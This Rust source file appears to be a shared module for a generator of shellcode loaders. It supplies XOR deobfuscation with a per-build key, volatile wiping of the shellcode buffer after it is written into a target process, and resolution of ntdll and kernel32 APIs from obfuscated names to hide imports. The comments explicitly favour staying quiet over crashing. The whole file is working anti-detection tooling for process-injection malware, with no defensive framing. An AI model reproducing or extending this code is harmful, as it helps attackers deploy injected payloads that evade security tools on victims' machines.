// Shared utilities injected into every generated loader via {{COMMON_MODULE}}.
// Single source of truth: the generator copies this verbatim into each project's src/.
//
// Not every template uses every helper, so unused items are allowed on purpose.
#![allow(dead_code)]

use std::ffi::CString;

#[link(name = "kernel32")]
extern "system" {
    #[link_name = "GetModuleHandleA"]
    fn rp_get_module_handle(name: *const u8) -> isize;
    #[link_name = "GetProcAddress"]
    fn rp_get_proc_address(module: isize, name: *const u8) -> usize;
}

/// Zero a buffer in a way that resists compiler optimisation, then clear it.
///
/// Used after the shellcode has been written into the target process so that
/// no plaintext copy lingers in the loader's own memory.
pub fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe {
            std::ptr::write_volatile(b as *mut u8, 0);
        }
    }
    buf.clear();
}

/// XOR a byte slice with the per-build obfuscation key.
pub fn deobfuscate_bytes(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

/// Resolve an API address in a loaded module from its obfuscated name.
///
/// Returns a null pointer instead of panicking when a string contains an
/// interior NUL or when the module is not loaded: a crash would be noisier
/// than a failed resolution, and callers already handle null addresses.
unsafe fn resolve_api_address(module: &str, obfuscated_name: &[u8], key: u8) -> *const () {
    let module_name = CString::new(module).unwrap_or_default();
    let module_handle = rp_get_module_handle(module_name.as_ptr() as *const u8);
    if module_handle == 0 {
        return std::ptr::null();
    }
    let api_name = CString::new(deobfuscate_bytes(obfuscated_name, key)).unwrap_or_default();
    rp_get_proc_address(module_handle, api_name.as_ptr() as *const u8) as *const ()
}

pub unsafe fn resolve_nt_api_address(obfuscated_name: &[u8], key: u8) -> *const () {
    resolve_api_address(&lc!("ntdll"), obfuscated_name, key)
}

pub unsafe fn resolve_kernel32_api_address(obfuscated_name: &[u8], key: u8) -> *const () {
    resolve_api_address(&lc!("kernel32"), obfuscated_name, key)
}
